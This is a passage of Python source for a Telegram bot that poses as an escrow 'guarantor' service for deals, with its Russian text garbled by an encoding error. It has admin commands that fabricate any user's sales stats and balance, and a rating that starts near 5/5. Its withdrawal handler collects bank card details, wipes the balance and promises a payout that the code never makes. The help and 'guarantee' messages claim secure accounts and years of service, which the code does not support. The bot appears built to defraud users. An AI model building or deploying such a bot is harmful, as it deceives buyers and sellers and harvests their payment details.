        bot.reply_to(message, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /set_my_stats <–ø—Ä–æ–¥–∞–∂–∏> <–ø–æ–∫—É–ø–∫–∏>")


@bot.message_handler(commands=['set_user_stats'])
def set_user_stats(message):
    user_id = message.from_user.id

    if not is_admin(user_id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º")
        return

    try:
        # –§–æ—Ä–º–∞—Ç: /set_user_stats <user_id> <–ø—Ä–æ–¥–∞–∂–∏> <–ø–æ–∫—É–ø–∫–∏>
        parts = message.text.split()
        if len(parts) < 4:
            raise ValueError

        target_user_id = int(parts[1])
        sales = int(parts[2])
        purchases = int(parts[3])

        if target_user_id not in user_stats:
            user_stats[target_user_id] = {"sales": 0, "purchases": 0}

        user_stats[target_user_id]["sales"] = sales
        user_stats[target_user_id]["purchases"] = purchases

        # –ü–æ–ª—É—á–∏–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
        user_name = user_info.get(target_user_id, {}).get("first_name", f"ID {target_user_id}")

        bot.reply_to(message, f"‚úÖ –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_name} –æ–±–Ω–æ–≤–ª–µ–Ω–∞!\n"
                              f"–ü—Ä–æ–¥–∞–∂–∏: {sales}\n"
                              f"–ü–æ–∫—É–ø–∫–∏: {purchases}\n"
                              f"–†–µ–π—Ç–∏–Ω–≥: {get_user_rating(target_user_id)}")

    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}\n"
                              "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /set_user_stats <user_id> <–ø—Ä–æ–¥–∞–∂–∏> <–ø–æ–∫—É–ø–∫–∏>")


@bot.message_handler(func=lambda message: message.text == 'üìä –ú–æ–π –ø—Ä–æ—Ñ–∏–ª—å')
def show_profile(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name

    if user_id not in users_balance:
        users_balance[user_id] = 0

    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏, –µ—Å–ª–∏ –µ—ë –Ω–µ—Ç
    if user_id not in user_stats:
        user_stats[user_id] = {"sales": 0, "purchases": 0}

    stats = user_stats[user_id]

    # –†–∞—Å—Å—á–∏—Ç–∞–µ–º —Ä–µ–π—Ç–∏–Ω–≥ –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
    rating = min(5.0, 4.5 + (stats['sales'] + stats['purchases']) * 0.1)

    info_text = (
        f"üë§ –ü–†–û–§–ò–õ–¨: {first_name}\n\n"
        f"‚≠ê –†–µ–π—Ç–∏–Ω–≥: {rating:.1f}/5.0\n"
        f"‚ñ´Ô∏è –í–∞—à ID: {user_id}\n"
        f"‚ñ´Ô∏è –ë–∞–ª–∞–Ω—Å: {users_balance[user_id]} RUB\n"
        "‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
        f"üì¶ –£—Å–ø–µ—à–Ω—ã—Ö –ø—Ä–æ–¥–∞–∂: {stats['sales']}\n"
        f"üõí –£—Å–ø–µ—à–Ω—ã—Ö –ø–æ–∫—É–ø–æ–∫: {stats['purchases']}\n"
        f"üèÜ –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞: {get_user_rating(user_id)}\n"
        "‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
        "üí∏ –î–ª—è –≤—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ /withdraw"
    )

    bot.send_message(message.chat.id, info_text)


@bot.message_handler(func=lambda message: message.text == 'üõí –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–¥–µ–ª–∫–∏')
def show_active_deals(message):
    active = []
    for deal_id, deal in deals_db.items():
        if deal['status'] in ['active', 'waiting_delivery']:
            status = "üü¢ –ê–∫—Ç–∏–≤–Ω–∞" if deal['status'] == 'active' else "üü° –û–∂–∏–¥–∞–µ—Ç –ø–æ–ª—É—á–µ–Ω–∏—è"
            active.append(f"‚ñ´Ô∏è #{deal_id} - {deal['description']} - {deal['amount']} {deal['currency']} ({status})")

    if not active:
        bot.reply_to(message, "‚ÑπÔ∏è –°–µ–π—á–∞—Å –Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–¥–µ–ª–æ–∫")
        return

    deals_text = (
            "üÜï –ê–ö–¢–ò–í–ù–´–ï –°–î–ï–õ–ö–ò\n\n" +
            "\n".join(active) +
            "\n‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
            "–î–ª—è —É—á–∞—Å—Ç–∏—è –≤ —Å–¥–µ–ª–∫–µ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –æ—Ç –ø—Ä–æ–¥–∞–≤—Ü–∞"
    )

    bot.send_message(message.chat.id, deals_text)


@bot.message_handler(commands=['withdraw'])
def handle_withdraw(message):
    user_id = message.from_user.id

    if user_id not in users_balance:
        users_balance[user_id] = 0

    if users_balance[user_id] <= 0:
        bot.reply_to(message, "‚ùå –ù–∞ –≤–∞—à–µ–º –±–∞–ª–∞–Ω—Å–µ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –≤—ã–≤–æ–¥–∞")
        return

    user_states[user_id] = {"step": "withdraw_details", "amount": users_balance[user_id]}
    bot.send_message(
        message.chat.id,
        f"üí≥ –í–≤–µ–¥–∏—Ç–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –≤—ã–≤–æ–¥–∞ {users_balance[user_id]} RUB:\n\n"
        "–ü—Ä–∏–º–µ—Ä: –°–±–µ—Ä–±–∞–Ω–∫ 2200 7000 8000 5500"
    )


@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'withdraw_details')
def handle_withdraw_details(message):
    user_id = message.from_user.id
    details = message.text

    amount = user_states[user_id]['amount']
    users_balance[user_id] = 0

    bot.send_message(
        message.chat.id,
        f"‚úÖ –ó–ê–ü–†–û–° –ù–ê –í–´–í–û–î {amount} RUB –û–¢–ü–†–ê–í–õ–ï–ù!\n\n"
        f"‚ñ´Ô∏è –†–µ–∫–≤–∏–∑–∏—Ç—ã: {details}\n"
        "‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
        "‚ö†Ô∏è –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω –≤ —Ç–µ—á–µ–Ω–∏–µ 2 —Ä–∞–±–æ—á–∏—Ö –¥–Ω–µ–π\n\n"
        "–°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–∞—à–µ–≥–æ —Å–µ—Ä–≤–∏—Å–∞!"
    )

    del user_states[user_id]


@bot.message_handler(commands=['add_balance'])
def handle_add_balance(message):
    user_id = message.from_user.id

    if not is_admin(user_id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º")
        return

    try:
        parts = message.text.split()
        if len(parts) < 3:
            raise ValueError

        target_user_id = int(parts[1])
        amount = float(parts[2])

        if target_user_id not in users_balance:
            users_balance[target_user_id] = 0

        users_balance[target_user_id] += amount

        bot.reply_to(message, f"‚úÖ –ë–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {target_user_id} –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ {amount} RUB")

    except:
        bot.reply_to(message, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /add_balance <user_id> <amount>")


@bot.message_handler(func=lambda message: message.text == '‚ÑπÔ∏è –ü–æ–º–æ—â—å')
def show_help(message):
    help_text = (
        "‚ÑπÔ∏è –ö–û–ú–ê–ù–î–´ –ò –ò–ù–°–¢–†–£–ö–¶–ò–Ø\n\n"
        "‚ñ´Ô∏è /start - –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é\n"
        "‚ñ´Ô∏è /withdraw - –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤\n"
        "‚ñ´Ô∏è /support - –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π\n"
        "‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
        "üõí –ö–∞–∫ —Å–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É:\n"
        "1. –î–æ–±–∞–≤—å—Ç–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –≤ 'üí≥ –ú–æ–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã'\n"
        "2. –ù–∞–∂–º–∏—Ç–µ '–°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É'\n"
        "3. –í–≤–µ–¥–∏—Ç–µ –æ–ø–∏—Å–∞–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞\n"
        "4. –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É\n"
        "5. –í—ã–±–µ—Ä–∏—Ç–µ –≤–∞–ª—é—Ç—É\n"
        "6. –ü–æ–¥–µ–ª–∏—Ç–µ—Å—å —Å—Å—ã–ª–∫–æ–π —Å –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º\n\n"
        "üí∞ –ö–∞–∫ –∫—É–ø–∏—Ç—å —Ç–æ–≤–∞—Ä:\n"
        "1. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –æ—Ç –ø—Ä–æ–¥–∞–≤—Ü–∞\n"
        "2. –û–ø–ª–∞—Ç–∏—Ç–µ —Ç–æ–≤–∞—Ä –ø–æ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º\n"
        "3. –ù–∞–∂–º–∏—Ç–µ '–Ø –æ–ø–ª–∞—Ç–∏–ª'\n"
        "4. –ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ–≤–∞—Ä–∞ –Ω–∞–∂–º–∏—Ç–µ '–Ø –ø–æ–ª—É—á–∏–ª –∑–∞–∫–∞–∑'\n\n"
        "üí≥ –¢—Ä–µ–±–æ–≤–∞–Ω–∏—è:\n"
        "‚ñ´Ô∏è –ü—Ä–æ–¥–∞–≤—Ü–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–æ–±–∞–≤–∏—Ç—å –ø–ª–∞—Ç–µ–∂–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã\n"
        "‚ñ´Ô∏è –í—Å–µ —Å–¥–µ–ª–∫–∏ –∑–∞—â–∏—â–µ–Ω—ã –≥–∞—Ä–∞–Ω—Ç–æ–º\n"
        "‚ñ´Ô∏è –°—Ä–µ–¥—Å—Ç–≤–∞ —Ö—Ä–∞–Ω—è—Ç—Å—è –Ω–∞ –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö —Å—á–µ—Ç–∞—Ö\n\n"
        "üí∏ –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –æ—Å—É—â–µ—Å—Ç–≤–ª—è–µ—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–µ 2 —Ä–∞–±–æ—á–∏—Ö –¥–Ω–µ–π\n"
        "üõ°Ô∏è –ì–∞—Ä–∞–Ω—Ç –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö —Å–¥–µ–ª–æ–∫ —Å 2023 –≥–æ–¥–∞"
    )

    bot.reply_to(message, help_text)


@bot.message_handler(commands=['support'])
def handle_support(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name

    markup = types.InlineKeyboardMarkup()
    support_btn = types.InlineKeyboardButton(
        text="üë®‚Äçüíº –ù–∞–ø–∏—Å–∞—Ç—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É",
        url="https://t.me/your_support_username"
    )
    markup.add(support_btn)

    bot.send_message(
        message.chat.id,
        f"üõü –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞\n\n"
        f"–ü—Ä–∏–≤–µ—Ç, {first_name}!\n"
        "–ï—Å–ª–∏ —É –≤–∞—Å –≤–æ–∑–Ω–∏–∫–ª–∏ –ø—Ä–æ–±–ª–µ–º—ã —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –±–æ—Ç–∞ –∏–ª–∏ —Å–¥–µ–ª–∫–æ–π, "
        "–Ω–∞—à–∞ —Å–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –≥–æ—Ç–æ–≤–∞ –ø–æ–º–æ—á—å.\n\n"
        "–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã —Å–≤—è–∑–∞—Ç—å—Å—è —Å –æ–ø–µ—Ä–∞—Ç–æ—Ä–æ–º:",
        reply_markup=markup
    )


def send_reminders():
    now = time.time()
    for deal_id, deal in list(deals_db.items()):
        if deal['status'] == 'waiting_delivery' and 'last_reminder' not in deal:
            seller_id = deal['seller_id']
            try:
                bot.send_message(
                    seller_id,
                    f"‚è∞ –ù–ê–ü–û–ú–ò–ù–ê–ù–ò–ï –ü–û –°–î–ï–õ–ö–ï #{deal_id}\n\n"
                    f"–ü–æ–∫—É–ø–∞—Ç–µ–ª—å —É–∂–µ –æ–ø–ª–∞—Ç–∏–ª —Ç–æ–≤–∞—Ä {deal['amount']} {deal['currency']}.\n"
                    "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–æ–≤–∞—Ä –∫–∞–∫ –º–æ–∂–Ω–æ —Å–∫–æ—Ä–µ–µ.\n\n"
                    "–ü–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–∏—Ç–µ –ø–æ–∫—É–ø–∞—Ç–µ–ª—é —Ç—Ä–µ–∫-–Ω–æ–º–µ—Ä –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è.\n\n"
                    "‚ö†Ô∏è –°—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –∑–∞–º–æ—Ä–æ–∂–µ–Ω—ã –¥–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ–≤–∞—Ä–∞ –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º."
                )
                deal['last_reminder'] = now
            except:
                pass

        elif deal['status'] == 'waiting_delivery' and now - deal.get('last_reminder', 0) > 86400:
            buyer_id = deal['buyer_id']
            try:
                bot.send_message(
                    buyer_id,
                    f"‚è∞ –ù–ê–ü–û–ú–ò–ù–ê–ù–ò–ï –ü–û –°–î–ï–õ–ö–ï #{deal_id}\n\n"
                    f"–ü—Ä–æ–¥–∞–≤–µ—Ü –¥–æ–ª–∂–µ–Ω –±—ã–ª –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–æ–≤–∞—Ä {deal['description']}.\n"
                    "–ï—Å–ª–∏ –≤—ã —É–∂–µ –ø–æ–ª—É—á–∏–ª–∏ —Ç–æ–≤–∞—Ä, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –ø–æ–ª—É—á–µ–Ω–∏–µ.\n\n"
                    "–ï—Å–ª–∏ –≤–æ–∑–Ω–∏–∫–ª–∏ –ø—Ä–æ–±–ª–µ–º—ã –∏–ª–∏ –∑–∞–¥–µ—Ä–∂–∫–∏, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /support"
                )
                deal['last_reminder'] = now
            except:
                pass


@bot.message_handler(func=lambda m: True)
def handle_other(message):
    text = message.text.lower()

    if text in ['–ø—Ä–∏–≤–µ—Ç', 'hi', 'hello']:
        bot.reply_to(message, f"üëã –ü—Ä–∏–≤–µ—Ç, {message.from_user.first_name}!")
    elif text in ['—Å–ø–∞—Å–∏–±–æ', '–±–ª–∞–≥–æ–¥–∞—Ä—é', 'thanks']:
        bot.reply_to(message, "üôè –ü–æ–∂–∞–ª—É–π—Å—Ç–∞! –û–±—Ä–∞—â–∞–π—Ç–µ—Å—å, –µ—Å–ª–∏ –ø–æ–Ω–∞–¥–æ–±–∏—Ç—Å—è –ø–æ–º–æ—â—å.")
    elif text in ['–≥–∞—Ä–∞–Ω—Ç', 'guarantee', '–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å']:
        bot.reply_to(message, "üõ°Ô∏è –í—Å–µ —Å–¥–µ–ª–∫–∏ –∑–∞—â–∏—â–µ–Ω—ã –≥–∞—Ä–∞–Ω—Ç–∏–π–Ω—ã–º —Å–µ—Ä–≤–∏—Å–æ–º:\n"
                              "- –°—Ä–µ–¥—Å—Ç–≤–∞ —Ö—Ä–∞–Ω—è—Ç—Å—è –Ω–∞ –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö —Å—á–µ—Ç–∞—Ö\n"
                              "- –ü—Ä–æ–¥–∞–≤–µ—Ü –ø–æ–ª—É—á–∞–µ—Ç –æ–ø–ª–∞—Ç—É —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ–≤–∞—Ä–∞\n"
                              "- –ü–æ–¥–¥–µ—Ä–∂–∫–∞ 24/7 –¥–ª—è —Ä–µ—à–µ–Ω–∏—è —Å–ø–æ—Ä–Ω—ã—Ö —Å–∏—Ç—É–∞—Ü–∏–π\n"
                              "- –°–∏—Å—Ç–µ–º–∞ —Ä–µ–π—Ç–∏–Ω–≥–∞ –¥–ª—è –Ω–∞–¥–µ–∂–Ω—ã—Ö —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤")
    elif text in ['—Å—Ç–∞—Ç—É—Å', 'status']:
        bot.reply_to(message, "üü¢ –ë–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ —à—Ç–∞—Ç–Ω–æ–º —Ä–µ–∂–∏–º–µ\n"
                              "–í—Å–µ —Å–∏—Å—Ç–µ–º—ã —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∏—Ä—É—é—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ\n"
                              "–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ: 02.07.2025")
    else:
        bot.reply_to(message, "‚ÑπÔ∏è –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –º–µ–Ω—é –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ –∏–ª–∏ /help –¥–ª—è –ø–æ–º–æ—â–∏")


if __name__ == "__main__":
    print("‚ö° –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
    print(f"–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—ã: {ADMIN_IDS}")

    import threading


    def reminder_loop():
        while True:
            try:
                send_reminders()
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –≤ –Ω–∞–ø–æ–º–∏–Ω–∞–Ω–∏—è—Ö: {e}")
            time.sleep(3600)


    reminder_thread = threading.Thread(target=reminder_loop, daemon=True)
    reminder_thread.start()

    bot.infinity_polling()